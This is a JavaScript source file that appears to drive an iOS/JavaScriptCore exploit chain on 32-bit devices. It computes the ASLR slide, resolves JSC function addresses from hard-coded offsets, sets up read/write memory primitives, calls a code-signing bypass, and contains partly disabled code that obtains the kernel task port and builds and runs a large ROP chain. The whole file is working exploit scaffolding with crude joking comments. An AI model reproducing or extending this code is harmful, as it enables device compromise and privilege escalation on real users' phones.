/*
 *  november 24th 2021
 *  [3:16 PM] spv: spice confuses the shit out of me, so i'm prolly not smart enough to implement it anyway
 *
 *  ohai
 */

var MAX_SLIDE = 0x3;
var MIN_SLIDE = 0x1;

var ARM_THREAD_STATE_COUNT = 0x11;
var ARM_THREAD_STATE = 0x1;
var LOG_SYSLOG = 0x28;

var PROT_READ = 0x1;
var PROT_WRITE = 0x2;
var PROT_EXEC = 0x4;

var MAP_PRIVATE = 0x2;
var MAP_ANON = 0x1000;

var victim = {a: 13.37};

if (0) {
/*
 *  leftover shit from jsc_fun, used to be using `log`
 */
try {
	puts("we out here in jsc");
} catch (e) {
	/*
	 *  we don't have puts. :(
	 */

	puts = function (){};
}
}

var JSStringCreateWithUTF8CString = 0x239f9d0d;
var JSObjectGetProperty = 0x239fa411;
var JSContextGetGlobalObject = 0x239f8dfd;

function main() {
	/*
	 *  get slide and calculate slid base
	 *  remember, 32-bit *OS defaults to 0x4000 for the unslid base for exec's
	 * 
	 *  so, take the slide, shift it by 12 bits (aslr is calc'd by taking a
	 *  random byte and shifting it 12 bits, in this case the page size, 4096
	 *  (0x1000) bytes), and add it to the unslid base.
	 */

	slide = get_our_slide();
	base = 0x4000 + (slide << 12);
	slid = (slide << 12);

	init_sptr_heap();

	scall("printf", "%x %x %x %x\n", 0x41, 0x42, 0x43, 0x44);

	puts("we out here");
	puts("I came through a portal holding a 40 and a blunt. Do you really wanna test me right now?");

	printf("slide=0x%x\n", slide);
	printf("*(uint8_t*)base = 0x%x\n", read_u8(base));
	printf("*(uint16_t*)base = 0x%x\n", read_u16(base));
	printf("*(uint32_t*)base = 0x%x\n", read_u32(base));

	var dyld_shc_slide = get_dyld_shc_slide();

	sym_cache["JSStringCreateWithUTF8CString"] = JSStringCreateWithUTF8CString + dyld_shc_slide;
	sym_cache["JSObjectGetProperty"] = JSObjectGetProperty + dyld_shc_slide;
	sym_cache["JSContextGetGlobalObject"] = JSContextGetGlobalObject + dyld_shc_slide;

	prep_shit();

	large_buf[0] = 0x41424344;
	printf("%x\n", read_u32(large_buf_ptr));

	setup_fancy_rw();

	csbypass();

	return;


	printf("%s\n", hexdump(read_buf(0x422200, 0x200), 8, 2, 0x422200, 8, '0'));

//return;
	var tfp0 = get_kernel_task();
	
	printf("tfp0=%x\n", tfp0);
	
	return;

	printf("dead?\n");
	var string_ref = scall("JSStringCreateWithUTF8CString", sptr("victim"));
	printf("dead? %x\n", string_ref);
	var global_object = scall("JSContextGetGlobalObject", read_u32(slid + reserve_addr + 0x44));
	printf("dead? %x\n", global_object);
	var jsobj_addr = scall("JSObjectGetProperty", read_u32(slid + reserve_addr + 0x44), global_object, string_ref, NULL);
	printf("dead?\n");

	printf("%x\n", jsobj_addr);
//	printf("%s\n", hexdump(read_buf(jsobj_addr - 0x100, 0x200), 8, 2, jsobj_addr - 0x100, 8, '0'));
	victim.target = parent;
	printf("%x\n", read_u32(jsobj_addr + 0x18));
//	printf("%s\n", prim_dump_u32(read_buf(jsobj_addr - 0x10, 0x60), jsobj_addr - 0x10));
//	printf("%s\n", hexdump(read_buf(jsobj_addr - 0x100, 0x200), 8, 2, jsobj_addr - 0x100, 8, '0'));

	/*
	    UIAlertView *alert = [[UIAlertView alloc] initWithTitle:@"ROFL" 
                                                    message:@"Dee dee doo doo." 
                                                    delegate:self 
                                                    cancelButtonTitle:@"OK" 
                                                    otherButtonTitles:nil];
		[alert show];
	 */

	return;

	var rop_buf = new Array();
	var nop = (0x781a | 1) + slid;
	var zero_arr = [].slice.call(u32_to_u8x4(0));
	var nop_arr = [].slice.call(u32_to_u8x4(nop));
	rop_buf.push(0);
	rop_buf.push(0);
	rop_buf.push(0);
	rop_buf.push(0);
	rop_buf.push(0);
	rop_buf.push(0);
	rop_buf.push(0);
	rop_buf.push(nop);
	for (var i = 0; i < 0x40000; i++) {
		rop_buf.push(0);
		rop_buf.push(0);
		rop_buf.push(0);
		rop_buf.push(0);
		rop_buf.push(nop);
		if (i % 0x1000 == 0) {
			printf("%x\n", i);
		}
	}
	rop_buf.push(0);
	rop_buf.push(0);
	rop_buf.push(0);
	rop_buf.push(0);
	rop_buf.push(0x41414141);

	printf("gen'd buf\n");

//	printf("%s\n", rop_buf[0].toString(16));
	
	printf("exec'ing\n");
	exec_rop(rop_buf);
	printf("done\n");

//	var tfp0 = get_kernel_task();

//	printf("tfp0=%x\n", tfp0);

	return;

	var i = 0;
	while (true) {
		syslog(LOG_SYSLOG, "get rekt from jsc %d (slide=%x)\n", i, slide);
		sleep(0);
		i++;
	}

	printf("still alive\n");
};
